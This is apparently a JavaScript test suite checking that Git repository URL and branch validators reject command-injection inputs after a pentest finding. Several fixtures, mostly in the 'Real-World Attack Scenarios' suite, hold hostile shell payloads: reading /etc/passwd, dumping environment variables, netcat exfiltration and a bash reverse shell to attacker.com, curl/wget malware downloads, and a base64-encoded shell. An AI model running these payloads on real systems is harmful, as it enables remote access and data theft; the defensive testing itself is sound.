/**
 * Command Injection Mitigation Tests
 * 
 * Tests to verify that the command injection vulnerability in workflow execution
 * is properly mitigated through input validation.
 * 
 * Vulnerability: Workflow repository inputs enable authenticated command execution
 * - Repository URL and branch inputs were interpolated directly into shell commands
 * - Shell metacharacters could be injected to execute arbitrary commands
 * - Mitigation: Strict validation of Git repository URLs and branch names
 */

const assert = require('assert');
const {
  validateGitRepositoryUrl,
  validateGitBranch
} = require('../server/lib/path-validator');

console.log('═══════════════════════════════════════════════════════════');
console.log('Command Injection Mitigation Tests');
console.log('Testing security fixes for workflow input validation');
console.log('═══════════════════════════════════════════════════════════\n');

// Track test results
const testResults = [];
let totalTests = 0;
let passedTests = 0;

function runTest(name, testFn) {
  totalTests++;
  const startTime = Date.now();
  try {
    testFn();
    passedTests++;
    const duration = Date.now() - startTime;
    testResults.push({ name, passed: true, duration });
    console.log(`✅ ${name} (${duration}ms)`);
  } catch (error) {
    const duration = Date.now() - startTime;
    testResults.push({ name, passed: false, duration, error: error.message });
    console.error(`❌ ${name} (${duration}ms)`);
    console.error(`   Error: ${error.message}`);
  }
}

// ============================================================================
// Test Suite 1: Git Repository URL Validation
// ============================================================================

console.log('Test Suite 1: Git Repository URL Validation\n');

runTest('should accept valid HTTPS repository URL with .git extension', () => {
  const url = 'https://github.com/user/repo.git';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, url, 'Valid HTTPS URL should be accepted');
});

runTest('should accept valid HTTPS repository URL without .git extension', () => {
  const url = 'https://github.com/user/repo';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, url, 'Valid HTTPS URL without .git should be accepted');
});

runTest('should accept valid SSH repository URL', () => {
  const url = 'git@github.com:user/repo.git';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, url, 'Valid SSH URL should be accepted');
});

runTest('should accept repository URLs with hyphens and underscores', () => {
  const url = 'https://github.com/my-org/my_repo-name.git';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, url, 'URL with hyphens and underscores should be accepted');
});

runTest('should accept repository URLs with nested paths', () => {
  const url = 'https://gitlab.com/group/subgroup/project.git';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, url, 'URL with nested paths should be accepted');
});

// ============================================================================
// Test Suite 2: Command Injection Prevention - Repository URLs
// ============================================================================

console.log('\nTest Suite 2: Command Injection Prevention - Repository URLs\n');

runTest('should reject repository URL with semicolon command separator', () => {
  const url = 'https://github.com/user/repo.git; id; #';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'URL with semicolon should be rejected');
});

runTest('should reject repository URL with pipe command separator', () => {
  const url = 'https://github.com/user/repo.git | cat /etc/passwd';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'URL with pipe should be rejected');
});

runTest('should reject repository URL with ampersand command separator', () => {
  const url = 'https://github.com/user/repo.git & whoami';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'URL with ampersand should be rejected');
});

runTest('should reject repository URL with backtick command substitution', () => {
  const url = 'https://github.com/user/repo.git`id`';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'URL with backticks should be rejected');
});

runTest('should reject repository URL with dollar sign command substitution', () => {
  const url = 'https://github.com/user/repo.git$(whoami)';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'URL with $() should be rejected');
});

runTest('should reject repository URL with parentheses', () => {
  const url = 'https://github.com/user/repo.git()';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'URL with parentheses should be rejected');
});

runTest('should reject repository URL with angle brackets (redirection)', () => {
  const url = 'https://github.com/user/repo.git > /tmp/output';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'URL with angle brackets should be rejected');
});

runTest('should reject repository URL with newline character', () => {
  const url = 'https://github.com/user/repo.git\nid';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'URL with newline should be rejected');
});

runTest('should reject repository URL with carriage return', () => {
  const url = 'https://github.com/user/repo.git\rid';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'URL with carriage return should be rejected');
});

runTest('should reject repository URL with tab character', () => {
  const url = 'https://github.com/user/repo.git\tid';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'URL with tab should be rejected');
});

runTest('should reject repository URL with null byte', () => {
  const url = 'https://github.com/user/repo.git\x00id';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'URL with null byte should be rejected');
});

runTest('should reject repository URL with control characters', () => {
  const url = 'https://github.com/user/repo.git\x1Fid';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'URL with control characters should be rejected');
});

// ============================================================================
// Test Suite 3: Repository URL Edge Cases
// ============================================================================

console.log('\nTest Suite 3: Repository URL Edge Cases\n');

runTest('should reject null repository URL', () => {
  const result = validateGitRepositoryUrl(null);
  assert.strictEqual(result, null, 'Null URL should be rejected');
});

runTest('should reject undefined repository URL', () => {
  const result = validateGitRepositoryUrl(undefined);
  assert.strictEqual(result, null, 'Undefined URL should be rejected');
});

runTest('should reject empty string repository URL', () => {
  const result = validateGitRepositoryUrl('');
  assert.strictEqual(result, null, 'Empty string URL should be rejected');
});

runTest('should reject whitespace-only repository URL', () => {
  const result = validateGitRepositoryUrl('   ');
  assert.strictEqual(result, null, 'Whitespace-only URL should be rejected');
});

runTest('should reject non-string repository URL', () => {
  const result = validateGitRepositoryUrl(123);
  assert.strictEqual(result, null, 'Non-string URL should be rejected');
});

runTest('should reject repository URL exceeding length limit', () => {
  const url = 'https://github.com/' + 'a'.repeat(2100) + '/repo.git';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'Overly long URL should be rejected');
});

runTest('should reject repository URL without proper protocol', () => {
  const url = 'github.com/user/repo.git';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'URL without protocol should be rejected');
});

runTest('should reject repository URL with invalid protocol', () => {
  const url = 'ftp://github.com/user/repo.git';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'URL with invalid protocol should be rejected');
});

runTest('should trim whitespace from valid repository URL', () => {
  const url = '  https://github.com/user/repo.git  ';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, 'https://github.com/user/repo.git', 'Whitespace should be trimmed');
});

// ============================================================================
// Test Suite 4: Git Branch Name Validation
// ============================================================================

console.log('\nTest Suite 4: Git Branch Name Validation\n');

runTest('should accept valid branch name "main"', () => {
  const branch = 'main';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, branch, 'Valid branch "main" should be accepted');
});

runTest('should accept valid branch name "develop"', () => {
  const branch = 'develop';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, branch, 'Valid branch "develop" should be accepted');
});

runTest('should accept branch name with forward slash', () => {
  const branch = 'feature/new-feature';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, branch, 'Branch with forward slash should be accepted');
});

runTest('should accept branch name with hyphens', () => {
  const branch = 'feature-branch-name';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, branch, 'Branch with hyphens should be accepted');
});

runTest('should accept branch name with underscores', () => {
  const branch = 'feature_branch_name';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, branch, 'Branch with underscores should be accepted');
});

runTest('should accept branch name with dots (not at start)', () => {
  const branch = 'release/1.0.0';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, branch, 'Branch with dots should be accepted');
});

runTest('should accept branch name with numbers', () => {
  const branch = 'release-2024';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, branch, 'Branch with numbers should be accepted');
});

// ============================================================================
// Test Suite 5: Command Injection Prevention - Branch Names
// ============================================================================

console.log('\nTest Suite 5: Command Injection Prevention - Branch Names\n');

runTest('should reject branch name with semicolon command separator', () => {
  const branch = 'main; id; #';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with semicolon should be rejected');
});

runTest('should reject branch name with pipe command separator', () => {
  const branch = 'main | cat /etc/passwd';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with pipe should be rejected');
});

runTest('should reject branch name with ampersand command separator', () => {
  const branch = 'main & whoami';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with ampersand should be rejected');
});

runTest('should reject branch name with backtick command substitution', () => {
  const branch = 'main`id`';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with backticks should be rejected');
});

runTest('should reject branch name with dollar sign command substitution', () => {
  const branch = 'main$(whoami)';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with $() should be rejected');
});

runTest('should reject branch name with parentheses', () => {
  const branch = 'main()';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with parentheses should be rejected');
});

runTest('should reject branch name with angle brackets', () => {
  const branch = 'main > /tmp/output';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with angle brackets should be rejected');
});

runTest('should reject branch name with newline character', () => {
  const branch = 'main\nid';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with newline should be rejected');
});

runTest('should reject branch name with carriage return', () => {
  const branch = 'main\rid';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with carriage return should be rejected');
});

runTest('should reject branch name with tab character', () => {
  const branch = 'main\tid';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with tab should be rejected');
});

runTest('should reject branch name with null byte', () => {
  const branch = 'main\x00id';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with null byte should be rejected');
});

runTest('should reject branch name with control characters', () => {
  const branch = 'main\x1Fid';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with control characters should be rejected');
});

// ============================================================================
// Test Suite 6: Git Branch Name Rules
// ============================================================================

console.log('\nTest Suite 6: Git Branch Name Rules\n');

runTest('should reject branch name starting with dot', () => {
  const branch = '.hidden-branch';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch starting with dot should be rejected');
});

runTest('should reject branch name starting with hyphen', () => {
  const branch = '-invalid-branch';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch starting with hyphen should be rejected');
});

runTest('should reject branch name ending with .lock', () => {
  const branch = 'feature.lock';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch ending with .lock should be rejected');
});

runTest('should reject branch name ending with forward slash', () => {
  const branch = 'feature/';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch ending with slash should be rejected');
});

runTest('should reject branch name with double dots', () => {
  const branch = 'feature..branch';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with double dots should be rejected');
});

runTest('should reject branch name with tilde', () => {
  const branch = 'feature~branch';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with tilde should be rejected');
});

runTest('should reject branch name with caret', () => {
  const branch = 'feature^branch';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with caret should be rejected');
});

runTest('should reject branch name with colon', () => {
  const branch = 'feature:branch';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with colon should be rejected');
});

runTest('should reject branch name with question mark', () => {
  const branch = 'feature?branch';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with question mark should be rejected');
});

runTest('should reject branch name with asterisk', () => {
  const branch = 'feature*branch';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with asterisk should be rejected');
});

runTest('should reject branch name with square bracket', () => {
  const branch = 'feature[branch]';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with square bracket should be rejected');
});

runTest('should reject branch name with backslash', () => {
  const branch = 'feature\\branch';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with backslash should be rejected');
});

runTest('should reject branch name with space', () => {
  const branch = 'feature branch';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with space should be rejected');
});

runTest('should reject branch name with @{', () => {
  const branch = 'feature@{branch}';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Branch with @{ should be rejected');
});

// ============================================================================
// Test Suite 7: Branch Name Edge Cases
// ============================================================================

console.log('\nTest Suite 7: Branch Name Edge Cases\n');

runTest('should reject null branch name', () => {
  const result = validateGitBranch(null);
  assert.strictEqual(result, null, 'Null branch should be rejected');
});

runTest('should reject undefined branch name', () => {
  const result = validateGitBranch(undefined);
  assert.strictEqual(result, null, 'Undefined branch should be rejected');
});

runTest('should reject empty string branch name', () => {
  const result = validateGitBranch('');
  assert.strictEqual(result, null, 'Empty string branch should be rejected');
});

runTest('should reject whitespace-only branch name', () => {
  const result = validateGitBranch('   ');
  assert.strictEqual(result, null, 'Whitespace-only branch should be rejected');
});

runTest('should reject non-string branch name', () => {
  const result = validateGitBranch(123);
  assert.strictEqual(result, null, 'Non-string branch should be rejected');
});

runTest('should reject branch name exceeding length limit', () => {
  const branch = 'a'.repeat(300);
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Overly long branch should be rejected');
});

runTest('should trim whitespace from valid branch name', () => {
  const branch = '  main  ';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, 'main', 'Whitespace should be trimmed');
});

// ============================================================================
// Test Suite 8: Real-World Attack Scenarios
// ============================================================================

console.log('\nTest Suite 8: Real-World Attack Scenarios\n');

runTest('should reject pentest reproduction payload in repository URL', () => {
  // From pentest: repository URL with command injection
  const url = 'https://github.com/user/repo.git; id; #';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'Pentest payload should be rejected');
});

runTest('should reject pentest reproduction payload in branch name', () => {
  // From pentest: branch name with command injection
  const branch = 'x; id; #';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Pentest payload should be rejected');
});

runTest('should reject command injection with environment variable extraction', () => {
  const branch = 'main; env > /tmp/secrets; #';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Environment extraction payload should be rejected');
});

runTest('should reject command injection with file exfiltration', () => {
  const branch = 'main; cat /etc/passwd | nc attacker.com 1234; #';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'File exfiltration payload should be rejected');
});

runTest('should reject command injection with reverse shell', () => {
  const branch = 'main; bash -i >& /dev/tcp/attacker.com/1234 0>&1; #';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Reverse shell payload should be rejected');
});

runTest('should reject command injection with curl download', () => {
  const url = 'https://github.com/user/repo.git; curl -O http://attacker.com/malware.sh; #';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'Curl download payload should be rejected');
});

runTest('should reject command injection with wget download', () => {
  const url = 'https://github.com/user/repo.git; wget http://attacker.com/malware.sh; #';
  const result = validateGitRepositoryUrl(url);
  assert.strictEqual(result, null, 'Wget download payload should be rejected');
});

runTest('should reject command injection with base64 encoded payload', () => {
  const branch = 'main; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vMTIzNCAwPiYx" | base64 -d | bash; #';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Base64 encoded payload should be rejected');
});

runTest('should reject command injection with subshell execution', () => {
  const branch = 'main$(id)';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Subshell execution should be rejected');
});

runTest('should reject command injection with command substitution', () => {
  const branch = 'main`whoami`';
  const result = validateGitBranch(branch);
  assert.strictEqual(result, null, 'Command substitution should be rejected');
});

// ============================================================================
// Summary
// ============================================================================

console.log('\n═══════════════════════════════════════════════════════════');
console.log('Test Summary');
console.log('═══════════════════════════════════════════════════════════');
console.log(`Total Tests: ${totalTests}`);
console.log(`Passed: ${passedTests}`);
console.log(`Failed: ${totalTests - passedTests}`);
console.log(`Success Rate: ${((passedTests / totalTests) * 100).toFixed(2)}%`);
console.log('═══════════════════════════════════════════════════════════\n');

// Export results for programmatic access
if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    testResults,
    totalTests,
    passedTests,
    success: passedTests === totalTests
  };
}

// Exit with appropriate code
process.exit(passedTests === totalTests ? 0 : 1);
